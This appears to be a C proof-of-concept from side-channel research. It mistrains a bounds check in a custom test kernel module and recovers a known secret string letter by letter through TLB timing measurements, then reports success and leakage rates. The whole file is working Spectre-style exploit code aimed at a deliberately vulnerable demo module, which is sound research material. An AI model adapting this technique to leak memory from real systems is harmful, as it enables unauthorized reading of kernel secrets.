/* See LICENSE file for license and copyright information */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <sched.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <getopt.h>

#include "libtlb.h"
#include "cacheutils.h"
#include "module/kernel_spectre.h"

#define COLOR_RED     "\x1b[31m"
#define COLOR_GREEN   "\x1b[32m"
#define COLOR_YELLOW  "\x1b[33m"
#define COLOR_BLUE    "\x1b[34m"
#define COLOR_MAGENTA "\x1b[35m"
#define COLOR_CYAN    "\x1b[36m"
#define COLOR_RESET   "\x1b[0m"
#define COLOR_WHITE   "\x1b[0m"

#define MIN(a, b) ((a) > (b)) ? (b) : (a)
#define _STR(x) #x
#define STR(x) _STR(x)

#define CORE1 3
#define HISTOGRAM_SCALE 5

#define TRIES 100

#define SECRET_OFFSET_START 3
#define SECRET_OFFSET_END 15
#define SECRET_LENGTH (SECRET_OFFSET_END - SECRET_OFFSET_START)
const char* SECRET_DATA_GROUND_TRUTH = KERNEL_SPECTRE_SECRET_DATA;

#define FIRST_LETTER 'A'
#define LAST_LETTER 'Z'
#define NUMBER_OF_LETTERS (LAST_LETTER-FIRST_LETTER+1)

size_t measurements[256][TRIES];
size_t results[SECRET_LENGTH][NUMBER_OF_LETTERS];
/* size_t results[256][NUMBER_OF_LETTERS+1]; */

size_t kernel_address = 0;

static uint64_t get_monotonic_time(void)
{
  struct timespec t1;
  clock_gettime(CLOCK_MONOTONIC, &t1);
  return t1.tv_sec * 1000*1000*1000ULL + t1.tv_nsec;
}

static void pin_thread_to_core(pthread_t p, int core) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    pthread_setaffinity_np(p, sizeof(cpu_set_t), &cpuset);
}

inline __attribute__((always_inline)) void prefetch(size_t p) {
  asm volatile ("prefetchnta (%0)" : : "r" (p));
  asm volatile ("prefetcht2 (%0)" : : "r" (p));
}

size_t measure(size_t address) {
  /* Begin measurement */
  size_t begin = rdtsc();

  prefetch(address);

  size_t end = rdtsc();

  return end - begin;
}

#define LENGTH(x) (sizeof(x)/sizeof((x)[0]))

static void
print_help(char* argv[]) {
  fprintf(stdout, "Usage: %s [OPTIONS]\n", argv[0]);
  fprintf(stdout, "\t-c, -core <value>\t Bind to cpu (default: " STR(CORE1) ")\n");
  fprintf(stdout, "\t-t, -thread <value>\t Bind access thread to cpu (default: " STR(CORE2) ")\n");
  fprintf(stdout, "\t-h, -help\t\t Help page\n");
}

void store_measurements_as_histogram(size_t offset)
{
  char measurement_name[256];
  sprintf(measurement_name, "%zu-%c.csv", offset, SECRET_DATA_GROUND_TRUTH[offset]);

  char measurement_name_raw[256];
  sprintf(measurement_name_raw, "%zu-%c_raw.csv", offset, SECRET_DATA_GROUND_TRUTH[offset]);

  FILE* f_raw = fopen(measurement_name_raw, "w");
  for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
    if (letter != LAST_LETTER) {
      fprintf(f_raw, "%c,", (char) letter);
    } else {
      fprintf(f_raw, "%c\n", (char) letter);
    }
  }

  size_t minimum = -1ull;
  size_t maximum = 0;

  for (size_t i = 0; i < TRIES; i++) {
    for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
      size_t value = measurements[letter][i];

      if (value < minimum && value != 0) {
        minimum = value;
      }

      if (value > maximum) {
        maximum = value;
      }

      /* Write raw file */
      if (letter != LAST_LETTER) {
        fprintf(f_raw, "%zd,", value);
      } else {
        fprintf(f_raw, "%zd\n", value);
      }
    }
  }

  fclose(f_raw);

  size_t histogram_length = ((maximum - minimum) / HISTOGRAM_SCALE);
  size_t* histogram[256] = {0};

  for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
    histogram[letter] = calloc(histogram_length, sizeof(size_t));
    if (histogram[letter] == NULL) {
      fprintf(stderr, "Error: Could not allocate histogram 0\n");
      return;
    }
  }

  for (size_t i = 0; i < TRIES; i++) {
    for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
      size_t histogram_index = MIN(histogram_length - 1, (measurements[letter][i] - minimum) / HISTOGRAM_SCALE);
      histogram[letter][histogram_index]++;
    }
  }

  FILE* f = fopen(measurement_name, "w");
  fprintf(f, "Cycle,");

  for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
    if (letter != LAST_LETTER) {
      fprintf(f, "%c,", (char) letter);
    } else {
      fprintf(f, "%c\n", (char) letter);
    }
  }

  for (size_t i = 0; i < histogram_length; i++) {
    bool print = false;
    for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
      if (histogram[letter][i] > 1) {
        print = true;
        break;
      }
    }

    if (print == true) {
      fprintf(f, "%zd,", minimum + (i * HISTOGRAM_SCALE));
      for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
        if (letter != LAST_LETTER) {
          fprintf(f, "%zd,", histogram[letter][i]);
        } else {
          fprintf(f, "%zd\n", histogram[letter][i]);
        }
      }
    }
  }

  for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
    free(histogram[letter]);
  }
}

int main(int argc, char* argv[])
{
  /* Parse arguments */
  size_t cpu = CORE1;
  bool verbose = false;
  bool store_files = false;

  static const char* short_options = "c:vsh";
  static struct option long_options[] = {
    {"cpu",             required_argument, NULL, 'c'},
    {"store",           no_argument,       NULL, 's'},
    {"help",            no_argument,       NULL, 'h'},
    {"verbose",         no_argument,       NULL, 'v'},
    { NULL,             0, NULL, 0}
  };

  size_t number_of_cpus = sysconf(_SC_NPROCESSORS_ONLN);

  int c;
  while ((c = getopt_long(argc, argv, short_options, long_options, NULL)) != -1) {
    switch (c) {
      case 'c':
        cpu = atoi(optarg);
        if (cpu >= number_of_cpus) {
          fprintf(stderr, "Error: CPU %zu is not available.\n", cpu);
          return -1;
        }
        break;
      case 'h':
        print_help(argv);
        return 0;
      case 'v':
        verbose = true;
        break;
      case 's':
        store_files = true;
        break;
      case ':':
        fprintf(stderr, "Error: option `-%c' requires an argument\n", optopt);
        break;
      case '?':
      default:
        fprintf(stderr, "Error: Invalid option '-%c'\n", optopt);
        return -1;
    }
  }

  /* Setup */
  tlb_init();
  memset(results, 0, SECRET_LENGTH * NUMBER_OF_LETTERS * sizeof(size_t));

  /* Open kernel module */
  int kernel_spectre_fd = open(KERNEL_SPECTRE_DEVICE_PATH, O_RDONLY);
  if (kernel_spectre_fd < 0) {
    printf ("Error: Can't open device file: %s\n", KERNEL_SPECTRE_DEVICE_PATH);
    return -1;
  }

  assert(ioctl(kernel_spectre_fd, KERNEL_SPECTRE_IOCTL_CMD_GET_ADDRESS, &kernel_address) == 0);
  if (verbose == true) {
    fprintf(stderr, "Kernel Address: %p\n", (void*) kernel_address);
  }

  /* Pin to core */
  pin_thread_to_core(pthread_self(), cpu);

  /* Statistics */
  size_t number_of_bytes = 0;
  size_t number_of_correct_bytes = 0;
  uint64_t start_time = get_monotonic_time();
  uint64_t end_time = 0;

  /* Run measurements */
  for (size_t offset = SECRET_OFFSET_START; offset < SECRET_OFFSET_END; offset++) {
    /* Reset measurements */
    memset(measurements, 0, 256 * TRIES);

    if (verbose) {
      fprintf(stderr, "----- Offset: %zu -----\n", offset);
    }

    size_t global_min = -1;

    for (size_t try = 0; try < TRIES; try++) {
      for (volatile int u = 0; u < 100; u++) {
        asm volatile ("nop");
      }

      /* Mistrain */
      for (size_t i = 0; i < 10; i++) {
        ioctl(kernel_spectre_fd, KERNEL_SPECTRE_IOCTL_CMD_ACCESS, 0);
      }

      /* Prepare */
      tlb_flush();
      asm volatile("lfence\n");

      /* Out of bounds access */
      ioctl(kernel_spectre_fd, KERNEL_SPECTRE_IOCTL_CMD_ACCESS, offset);
      asm volatile("lfence\n");

      /* Hacky Whacky */
      measure(kernel_address + 4096 * -5);
      asm volatile("lfence\n");

      for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
        /* Measure TLB */
        size_t measurement = measure(kernel_address + 4096 * letter);

        /* Measurement */
        if (measurement < global_min) {
          global_min = measurement;
        }

        measurements[letter][try] = measurement;
      }
    }

    if (verbose) {
      for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
        size_t min = 0;
        size_t max = 0;
        size_t sum = 0;
        size_t min_cnt = 0;

        for (size_t try = 0; try < TRIES; try++) {
          size_t measurement = measurements[letter][try];

          if (measurement < min || !min) {
            min = measurement;
          }

          if (measurement > max) {
            max = measurement;
          }

          if (measurement == global_min) {
            min_cnt += 1;
          }

          sum += measurement;
        }

        size_t metric = sum / TRIES;

        fprintf(stderr, "%s" "%c: %zu (min: %zu (%zu), max: %zu) %s\n" COLOR_RESET,
            (letter == SECRET_DATA_GROUND_TRUTH[offset]) ? COLOR_GREEN : "",
            (char) letter, metric, min, min_cnt, max,
            (letter == SECRET_DATA_GROUND_TRUTH[offset]) ? "*" : ""
        );
      }
    }

        /* size_t metric = sum / TRIES; */
        /*  */
        /* size_t min_cnt = 0; */
        /* for (size_t try = 0; try < TRIES; try++) { */
        /*   if (measurements[letter][try] == min) { */
        /*     min_cnt += 1; */
        /*   } */
        /* } */

      /* if (verbose) { */
      /*   fprintf(stderr, "%s" "%c: %zu (min: %zu (%zu), max: %zu) %s\n" COLOR_RESET, */
      /*       (letter == SECRET_DATA_GROUND_TRUTH[offset]) ? COLOR_GREEN : "", */
      /*       (char) letter, metric, min, min_cnt, max, */
      /*       (letter == SECRET_DATA_GROUND_TRUTH[offset]) ? "*" : "" */
      /*   ); */
      /* } */
      /*  */
      /* results[offset-SECRET_OFFSET_START][letter-FIRST_LETTER] = metric; */
      /*  */
      /* if (min < global_min) { */
      /*   global_min = min; */
      /* } */
    /* } */

    /* Best choice */
    size_t letter_winner = 0;
    size_t min_cnt_max = 0;
    size_t min_metric = -1;

    for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
      size_t min_cnt = 0;
      size_t sum = 0;
      for (size_t try = 0; try < TRIES; try++) {
        size_t measurement = measurements[letter][try];
        if (measurement == global_min) {
          min_cnt += 1;
        }
        sum += measurement;
      }
      size_t metric = sum / TRIES;

      // TODO: Improve metric
      if (min_cnt > min_cnt_max) {
        min_cnt_max = min_cnt;
        letter_winner = letter;
      }

      if (metric < min_metric) {
        min_metric = metric;
      }
    }

    fprintf(stderr, "%s" "%c (min_cnt = %zu)\n" COLOR_RESET,
        (letter_winner == SECRET_DATA_GROUND_TRUTH[offset]) ? COLOR_GREEN : "",
        (char) letter_winner, min_cnt_max
    );

    number_of_bytes += 1;
    if (letter_winner == SECRET_DATA_GROUND_TRUTH[offset]) {
      number_of_correct_bytes += 1;
    }

    if (store_files == true) {
      store_measurements_as_histogram(offset);
    }
  }

  /* Print statistics */
  end_time = get_monotonic_time();
  uint64_t time_diff = end_time - start_time;
  float success_rate = ((float) number_of_correct_bytes / number_of_bytes) * 100.;
  float leakage_rate = (float) number_of_bytes;
  leakage_rate /= (float) (time_diff / 10e8);

  fprintf(stderr, "===== Statistics =====\n");
  fprintf(stderr, "Time: %.2f seconds\n", ((float) time_diff / 10e8));
  fprintf(stderr, "Number of Bytes: %zu\n", number_of_bytes);
  fprintf(stderr, "Correct Bytes: %zu\n", number_of_correct_bytes);
  fprintf(stderr, "Success Rate: %.2f%%\n", success_rate);
  fprintf(stderr, "Leakage Rate: %.2f B/s\n", leakage_rate);

  /* Store results */
  if (store_files == true) {
    FILE* f = fopen("result.csv", "w");
    fprintf(f, "Letter,");
    for (size_t offset = SECRET_OFFSET_START; offset < SECRET_OFFSET_END; offset++) {
      if (offset != SECRET_OFFSET_END - 1) {
        fprintf(f, "Bit%zu,", offset);
      } else {
        fprintf(f, "Bit%zu\n", offset);
      }
    }

    for (size_t letter = FIRST_LETTER; letter <= LAST_LETTER; letter++) {
      fprintf(f,"%zu,", letter);
      for (size_t offset = SECRET_OFFSET_START; offset < SECRET_OFFSET_END; offset++) {
        if (offset != SECRET_OFFSET_END - 1) {
          fprintf(f, "%zd,", results[offset-SECRET_OFFSET_START][letter-FIRST_LETTER]);
        } else {
          fprintf(f, "%zd\n", results[offset-SECRET_OFFSET_START][letter-FIRST_LETTER]);
        }
      }
    }
    fclose(f);
  }

  /* Clean-up */
  close(kernel_spectre_fd);

  return 0;
}

